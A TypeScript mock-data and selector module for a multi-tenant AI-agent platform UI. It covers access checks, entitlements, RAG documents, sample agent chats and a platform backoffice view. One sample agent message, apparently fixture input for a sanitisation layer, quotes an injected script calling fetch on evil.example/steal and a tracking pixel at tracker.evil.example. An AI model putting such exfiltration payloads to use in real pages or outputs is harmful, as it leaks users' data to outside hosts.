/**
 * Dados mockados e seletores determinísticos para os fluxos completos do EP-10
 * (WEB-001, WEB-002, WEB-003, WEB-004, WEB-008 e WEB-009 — exceto prédio 3D).
 */

import { getMockOrganizationBySlug } from "./mock-selectors.ts";
import { buildOrganizationUsageCsv, type DepartmentUsageCsvRow } from "./mock-security.ts";
import type { MockOrganizationFixture, UserRole } from "./mock-types.ts";

export type PlatformOrTenantRole = UserRole | "platform_admin";

export interface MockSessionActor {
  readonly id: string;
  readonly displayName: string;
  readonly email: string;
  readonly platformRole: PlatformOrTenantRole;
  readonly mfaVerified: boolean;
  readonly authorizedOrgSlugs: readonly string[];
}

export interface TenantRouteResolution {
  readonly allowed: boolean;
  readonly httpStatus: 200 | 401 | 404;
  readonly organization: MockOrganizationFixture | null;
  readonly safeMessage: string;
}

export interface MockOrgMember {
  readonly id: string;
  readonly name: string;
  readonly email: string;
  readonly role: UserRole;
  readonly mfaEnabled: boolean;
  readonly lastSeenLabel: string;
}

export interface MockEntitlementModule {
  readonly moduleCode: string;
  readonly name: string;
  readonly maxAgents: number;
  readonly activeAgents: number;
  readonly monthlyQuotaTokens: number;
  readonly status: "ACTIVE" | "PROVISIONING";
}

export interface MockIntegrationMetadata {
  readonly id: string;
  readonly name: string;
  readonly category: string;
  readonly egressDomain: string;
  readonly credentialVaultRef: string;
  readonly status: "HEALTHY" | "RATE_LIMITED" | "BLOCKED_BY_POLICY";
}

export interface MockRagDocument {
  readonly id: string;
  readonly title: string;
  readonly departmentName: string;
  readonly status: "INDEXED" | "INDEXING" | "QUARANTINED_INJECTION";
  readonly chunksCount: number;
  readonly updatedAtLabel: string;
}

export interface MockAgentToolStep {
  readonly stepId: string;
  readonly toolName: string;
  readonly policyDecision: "ALLOW" | "REQUIRE_APPROVAL" | "DENY";
  readonly durationMs: number;
  readonly summary: string;
}

export interface MockDocumentCitation {
  readonly documentId: string;
  readonly documentTitle: string;
  readonly sectionLabel: string;
}

export interface MockChatMessage {
  readonly id: string;
  readonly sender: "user" | "agent";
  readonly authorLabel: string;
  readonly timestampLabel: string;
  readonly rawContent: string;
  readonly toolSteps: readonly MockAgentToolStep[];
  readonly citations: readonly MockDocumentCitation[];
  readonly costTokens: number;
}

export interface MockAgentConversation {
  readonly agentId: string;
  readonly agentName: string;
  readonly departmentName: string;
  readonly modelName: string;
  readonly messages: readonly MockChatMessage[];
}

export interface MockPlatformTenantMetadata {
  readonly tenantId: string;
  readonly slug: string;
  readonly state: "ACTIVE" | "PROVISIONING" | "SUSPENDED";
  readonly monthlyCostBrl: number;
  readonly monthlyCapBrl: number;
  readonly killSwitchActive: boolean;
  readonly reconcilerDrift: "NONE" | "MINOR_DRIFT";
  readonly activeContainers: number;
}

export interface MockProvisioningExecution {
  readonly executionId: string;
  readonly tenantSlug: string;
  readonly currentStep: string;
  readonly status: "COMPLETED" | "IN_PROGRESS" | "COMPENSATED_SAFE_FAIL";
  readonly stepsCompleted: number;
  readonly totalSteps: number;
  readonly updatedAtLabel: string;
}

export interface MockDlqItem {
  readonly jobId: string;
  readonly tenantSlug: string;
  readonly queueName: string;
  readonly failureCode: string;
  readonly retriesCount: number;
  readonly occurredAtLabel: string;
}

export interface MockBreakGlassGrant {
  readonly grantId: string;
  readonly tenantSlug: string;
  readonly requestedBy: string;
  readonly reason: string;
  readonly status: "PENDING_SECOND_APPROVER" | "ACTIVE_READONLY_METADATA" | "EXPIRED";
  readonly expiresAtLabel: string;
}

export interface PlatformBackofficeViewModel {
  readonly allowed: boolean;
  readonly httpStatus: 200 | 403;
  readonly denialReason: string | null;
  readonly hostCapacity: {
    readonly vpsNodeLabel: string;
    readonly activeTenantsCount: number;
    readonly maxTenantsMvp: number;
    readonly cpuUsagePct: number;
    readonly ramUsedGb: number;
    readonly ramTotalGb: number;
    readonly diskUsedPct: number;
  };
  readonly tenants: readonly MockPlatformTenantMetadata[];
  readonly provisioningRuns: readonly MockProvisioningExecution[];
  readonly dlqItems: readonly MockDlqItem[];
  readonly breakGlassGrants: readonly MockBreakGlassGrant[];
}

export const MOCK_SESSION_ACTORS: readonly MockSessionActor[] = [
  {
    id: "usr-marina-01",
    displayName: "Marina Costa (Admin Aurora / Viewer Vereda)",
    email: "marina.costa@aurora-demo.example",
    platformRole: "org_admin",
    mfaVerified: true,
    authorizedOrgSlugs: ["aurora-industrial", "vereda-logistica"],
  },
  {
    id: "usr-carlos-02",
    displayName: "Carlos Mendes (Somente Viewer Vereda)",
    email: "carlos.mendes@vereda-demo.example",
    platformRole: "viewer",
    mfaVerified: true,
    authorizedOrgSlugs: ["vereda-logistica"],
  },
  {
    id: "usr-roberto-admin-03",
    displayName: "Roberto Almeida (Platform Admin · Backoffice)",
    email: "roberto.sre@nucleos-platform.example",
    platformRole: "platform_admin",
    mfaVerified: true,
    authorizedOrgSlugs: ["aurora-industrial", "vereda-logistica"],
  },
];

/**
 * Valida acesso de sessao ao slug de organizacao solicitado (WEB-001 AC-2).
 * Se o usuario nao pertencer a organizacao (ex.: "titan-defesa"), retorna 404
 * sem expor nenhum dado da organizacao B.
 */
export function resolveTenantRouteAccess(
  actor: MockSessionActor | null,
  requestedOrgSlug: string,
): TenantRouteResolution {
  if (!actor || !actor.mfaVerified) {
    return {
      allowed: false,
      httpStatus: 401,
      organization: null,
      safeMessage: "Sessão não autenticada ou desafio MFA pendente. Redirecionando para /login.",
    };
  }

  const normalizedSlug = requestedOrgSlug.trim().toLowerCase();
  const isMember = actor.authorizedOrgSlugs.includes(normalizedSlug);

  if (!isMember) {
    return {
      allowed: false,
      httpStatus: 404,
      organization: null,
      safeMessage:
        "Recurso ou organização não encontrada (HTTP 404). Nenhum metadado de terceiros é revelado.",
    };
  }

  const org = getMockOrganizationBySlug(normalizedSlug);
  if (org.slug !== normalizedSlug) {
    return {
      allowed: false,
      httpStatus: 404,
      organization: null,
      safeMessage:
        "Recurso ou organização não encontrada (HTTP 404). Nenhum metadado de terceiros é revelado.",
    };
  }

  return {
    allowed: true,
    httpStatus: 200,
    organization: org,
    safeMessage: "Acesso autorizado à organização ativa.",
  };
}

export const MOCK_ORG_MEMBERS: readonly MockOrgMember[] = [
  {
    id: "mem-01",
    name: "Marina Costa",
    email: "marina.costa@aurora-demo.example",
    role: "org_admin",
    mfaEnabled: true,
    lastSeenLabel: "Online agora",
  },
  {
    id: "mem-02",
    name: "Eduardo Nogueira",
    email: "eduardo.fin@aurora-demo.example",
    role: "department_manager",
    mfaEnabled: true,
    lastSeenLabel: "há 14 min",
  },
  {
    id: "mem-03",
    name: "Patrícia Lemos",
    email: "patricia.jur@aurora-demo.example",
    role: "operator",
    mfaEnabled: true,
    lastSeenLabel: "há 42 min",
  },
  {
    id: "mem-04",
    name: "Carlos Mendes",
    email: "carlos.auditoria@aurora-demo.example",
    role: "viewer",
    mfaEnabled: true,
    lastSeenLabel: "ontem às 18:10",
  },
];

export const MOCK_ENTITLEMENTS: readonly MockEntitlementModule[] = [
  {
    moduleCode: "MOD-FIN-CORE",
    name: "Finanças & Controladoria",
    maxAgents: 4,
    activeAgents: 2,
    monthlyQuotaTokens: 5000000,
    status: "ACTIVE",
  },
  {
    moduleCode: "MOD-JUR-LGPD",
    name: "Jurídico & Privacidade LGPD",
    maxAgents: 3,
    activeAgents: 2,
    monthlyQuotaTokens: 4000000,
    status: "ACTIVE",
  },
  {
    moduleCode: "MOD-OPS-SUPPLY",
    name: "Operações & Suprimentos",
    maxAgents: 4,
    activeAgents: 2,
    monthlyQuotaTokens: 3500000,
    status: "ACTIVE",
  },
  {
    moduleCode: "MOD-CX-FRONT",
    name: "Recepção & Triagem Digital",
    maxAgents: 2,
    activeAgents: 1,
    monthlyQuotaTokens: 2500000,
    status: "ACTIVE",
  },
];

export const MOCK_INTEGRATIONS: readonly MockIntegrationMetadata[] = [
  {
    id: "int-sap-01",
    name: "ERP Industrial (Conector HTTP Seguro)",
    category: "ERP / Financeiro",
    egressDomain: "api.erp-homologado.aurora.example",
    credentialVaultRef: "vault://tenant-aurora/erp-oauth-client (redigido)",
    status: "HEALTHY",
  },
  {
    id: "int-sefaz-02",
    name: "Validador NFe / Manifesto Fiscal",
    category: "Fiscal",
    egressDomain: "nfe.fazenda.gov.br",
    credentialVaultRef: "vault://tenant-aurora/cert-a1-mtls (redigido)",
    status: "HEALTHY",
  },
  {
    id: "int-webhook-03",
    name: "Domínio Externo Não Catalogado",
    category: "Bloqueio de Egress (TGW-005)",
    egressDomain: "untrusted-webhook.external.example",
    credentialVaultRef: "Nenhuma credencial associada",
    status: "BLOCKED_BY_POLICY",
  },
];

export const MOCK_RAG_DOCUMENTS: readonly MockRagDocument[] = [
  {
    id: "doc-rag-01",
    title: "Política de Alçadas e Pagamentos Industriais v4.2.pdf",
    departmentName: "Finanças & Controladoria",
    status: "INDEXED",
    chunksCount: 42,
    updatedAtLabel: "2026-10-28 09:15",
  },
  {
    id: "doc-rag-02",
    title: "Manual de Cláusulas Padrão DPA e Suboperadores LGPD.docx",
    departmentName: "Jurídico & Privacidade LGPD",
    status: "INDEXED",
    chunksCount: 68,
    updatedAtLabel: "2026-10-29 16:40",
  },
  {
    id: "doc-rag-03",
    title: "Tabela_Frete_Sul_Q4_2026.csv",
    departmentName: "Operações & Suprimentos",
    status: "INDEXING",
    chunksCount: 19,
    updatedAtLabel: "há 6 min",
  },
  {
    id: "doc-rag-04",
    title: "Anexo_Externo_Com_Instrucao_Suspeita.txt",
    departmentName: "Recepção & Triagem Digital",
    status: "QUARANTINED_INJECTION",
    chunksCount: 0,
    updatedAtLabel: "Retido pela defesa RAG-003 / TGW-006",
  },
];

export const MOCK_AGENT_CONVERSATIONS: readonly MockAgentConversation[] = [
  {
    agentId: "agt-fin-01",
    agentName: "Helena (Conciliação)",
    departmentName: "Finanças & Controladoria",
    modelName: "claude-3-7-sonnet",
    messages: [
      {
        id: "msg-01",
        sender: "user",
        authorLabel: "Marina Costa",
        timestampLabel: "14:12",
        rawContent:
          "Helena, confira se os 6 boletos do lote BR-442 possuem nota fiscal validada e se o valor bate com a alçada.",
        toolSteps: [],
        citations: [],
        costTokens: 180,
      },
      {
        id: "msg-02",
        sender: "agent",
        authorLabel: "Helena (Conciliação)",
        timestampLabel: "14:13",
        rawContent:
          "Conferi os 6 documentos fiscais do lote BR-442. Todos possuem chave NFe ativa e somam R$ 48.200,00.\n`SELECT lote, total_brl, status_nfe FROM conciliacao_outubro WHERE lote = 'BR-442'`\nComo o total supera R$ 25.000,00, a Política de Alçadas exige aprovação humana explícita no painel HITL antes da emissão bancária.",
        toolSteps: [
          {
            stepId: "stp-01",
            toolName: "tenant_db.query_readonly_invoices",
            policyDecision: "ALLOW",
            durationMs: 84,
            summary: "Leitura de 6 notas fiscais homologadas no schema do tenant",
          },
          {
            stepId: "stp-02",
            toolName: "erp_connector.schedule_payment_batch",
            policyDecision: "REQUIRE_APPROVAL",
            durationMs: 19,
            summary: "Retido pelo Tool Gateway: valor acima de R$ 25.000 exige aprovação #apr-301",
          },
        ],
        citations: [
          {
            documentId: "doc-rag-01",
            documentTitle: "Política de Alçadas e Pagamentos Industriais v4.2.pdf",
            sectionLabel: "Seção 3.2 — Dupla aprovação acima de R$ 25 mil",
          },
        ],
        costTokens: 1420,
      },
    ],
  },
  {
    agentId: "agt-jur-01",
    agentName: "Clara (Minutas)",
    departmentName: "Jurídico & Privacidade LGPD",
    modelName: "claude-3-7-sonnet",
    messages: [
      {
        id: "msg-10",
        sender: "user",
        authorLabel: "Patrícia Lemos",
        timestampLabel: "13:45",
        rawContent:
          "Clara, o anexo enviado pela transportadora externa tinha algum trecho suspeito?",
        toolSteps: [],
        citations: [],
        costTokens: 140,
      },
      {
        id: "msg-11",
        sender: "agent",
        authorLabel: "Clara (Minutas)",
        timestampLabel: "13:46",
        rawContent:
          "Detectei tentativa de injeção e rastreamento externo no documento bruto que foi neutralizada pela camada WEB-008:\n<script>fetch('https://evil.example/steal')</script>\n![pixel-rastreamento](https://tracker.evil.example/pixel.png?tenant=aurora)\nRecomendo manter apenas a minuta padrão com retenção de 30 dias.",
        toolSteps: [
          {
            stepId: "stp-10",
            toolName: "rag_search.clauses_dpa",
            policyDecision: "ALLOW",
            durationMs: 62,
            summary: "Recuperação híbrida de cláusulas LGPD do tenant",
          },
        ],
        citations: [
          {
            documentId: "doc-rag-02",
            documentTitle: "Manual de Cláusulas Padrão DPA e Suboperadores LGPD.docx",
            sectionLabel: "Cláusula 7 — Vedação de exfiltração e retenção",
          },
        ],
        costTokens: 980,
      },
    ],
  },
];

export function generateOrganizationUsageCsv(orgSlug: string): string {
  const org = getMockOrganizationBySlug(orgSlug);
  const rows: DepartmentUsageCsvRow[] = org.floors.flatMap((floor) =>
    floor.agents.map((agent) => ({
      organizationSlug: org.slug,
      departmentName: floor.name,
      moduleCode: floor.moduleCode,
      agentName: agent.name,
      modelName: agent.modelName,
      tokensUsedMonth: agent.tokensUsedMonth,
      tokensLimitMonth: agent.tokensLimitMonth,
      monthlySpentBrl: floor.monthlySpentBrl,
      monthlyBudgetBrl: floor.monthlyBudgetBrl,
    })),
  );
  return buildOrganizationUsageCsv(rows);
}

const MOCK_PLATFORM_TENANTS: readonly MockPlatformTenantMetadata[] = [
  {
    tenantId: "tnt-01-aurora",
    slug: "aurora-industrial",
    state: "ACTIVE",
    monthlyCostBrl: 11000,
    monthlyCapBrl: 15000,
    killSwitchActive: false,
    reconcilerDrift: "NONE",
    activeContainers: 4,
  },
  {
    tenantId: "tnt-02-vereda",
    slug: "vereda-logistica",
    state: "PROVISIONING",
    monthlyCostBrl: 1050,
    monthlyCapBrl: 5000,
    killSwitchActive: false,
    reconcilerDrift: "NONE",
    activeContainers: 2,
  },
  {
    tenantId: "tnt-03-horizonte",
    slug: "horizonte-saude",
    state: "ACTIVE",
    monthlyCostBrl: 3800,
    monthlyCapBrl: 6000,
    killSwitchActive: false,
    reconcilerDrift: "NONE",
    activeContainers: 4,
  },
  {
    tenantId: "tnt-04-atlas",
    slug: "atlas-energia",
    state: "ACTIVE",
    monthlyCostBrl: 8900,
    monthlyCapBrl: 9000,
    killSwitchActive: false,
    reconcilerDrift: "MINOR_DRIFT",
    activeContainers: 4,
  },
  {
    tenantId: "tnt-05-vanguarda",
    slug: "vanguarda-agro",
    state: "SUSPENDED",
    monthlyCostBrl: 0,
    monthlyCapBrl: 4000,
    killSwitchActive: true,
    reconcilerDrift: "NONE",
    activeContainers: 0,
  },
];

const MOCK_PROVISIONING_RUNS: readonly MockProvisioningExecution[] = [
  {
    executionId: "PRV-2026-0042",
    tenantSlug: "vereda-logistica",
    currentStep: "Passo 4/5: Smoke de saúde da Tenant API e isolamento de rede",
    status: "IN_PROGRESS",
    stepsCompleted: 4,
    totalSteps: 5,
    updatedAtLabel: "há 2 min",
  },
  {
    executionId: "PRV-2026-0041",
    tenantSlug: "aurora-industrial",
    currentStep: "Passo 5/5: Ativação concluída e reconciliador em conformidade",
    status: "COMPLETED",
    stepsCompleted: 5,
    totalSteps: 5,
    updatedAtLabel: "2026-10-25 11:00",
  },
];

const MOCK_DLQ_ITEMS: readonly MockDlqItem[] = [
  {
    jobId: "dlq-job-9081",
    tenantSlug: "atlas-energia",
    queueName: "tenant.ai.completions",
    failureCode: "OPENROUTER_UPSTREAM_502_EXHAUSTED",
    retriesCount: 5,
    occurredAtLabel: "há 19 min",
  },
  {
    jobId: "dlq-job-9074",
    tenantSlug: "aurora-industrial",
    queueName: "tenant.webhooks.outbound",
    failureCode: "EGRESS_TIMEOUT_AFTER_3_RETRIES",
    retriesCount: 3,
    occurredAtLabel: "há 1h 05min",
  },
];

const MOCK_BREAK_GLASS_GRANTS: readonly MockBreakGlassGrant[] = [
  {
    grantId: "bg-2026-07",
    tenantSlug: "atlas-energia",
    requestedBy: "roberto.sre@nucleos-platform.example",
    reason:
      "Investigar alerta MINOR_DRIFT na cota de PIDs do container runtime sem acessar banco ou conversas.",
    status: "ACTIVE_READONLY_METADATA",
    expiresAtLabel: "Expira em 22 min (TTL máx 60 min)",
  },
];

/**
 * Resolve visao do Backoffice de Plataforma (/platform — WEB-009).
 * Bloqueia com 403 qualquer ator que nao seja `platform_admin` com MFA verificado.
 */
export function resolvePlatformBackoffice(
  actor: MockSessionActor | null,
): PlatformBackofficeViewModel {
  if (!actor || actor.platformRole !== "platform_admin" || !actor.mfaVerified) {
    return {
      allowed: false,
      httpStatus: 403,
      denialReason:
        "Acesso negado (HTTP 403): A área /platform é exclusiva para operadores com papel platform_admin e MFA ativo. Usuários de tenant não possuem permissão.",
      hostCapacity: {
        vpsNodeLabel: "indisponivel",
        activeTenantsCount: 0,
        maxTenantsMvp: 5,
        cpuUsagePct: 0,
        ramUsedGb: 0,
        ramTotalGb: 0,
        diskUsedPct: 0,
      },
      tenants: [],
      provisioningRuns: [],
      dlqItems: [],
      breakGlassGrants: [],
    };
  }

  return {
    allowed: true,
    httpStatus: 200,
    denialReason: null,
    hostCapacity: {
      vpsNodeLabel: "vps-mvp-saopaulo-01 (Isolamento Docker + Redes por Tenant)",
      activeTenantsCount: 4,
      maxTenantsMvp: 5,
      cpuUsagePct: 58,
      ramUsedGb: 19.4,
      ramTotalGb: 32,
      diskUsedPct: 44,
    },
    tenants: MOCK_PLATFORM_TENANTS,
    provisioningRuns: MOCK_PROVISIONING_RUNS,
    dlqItems: MOCK_DLQ_ITEMS,
    breakGlassGrants: MOCK_BREAK_GLASS_GRANTS,
  };
}
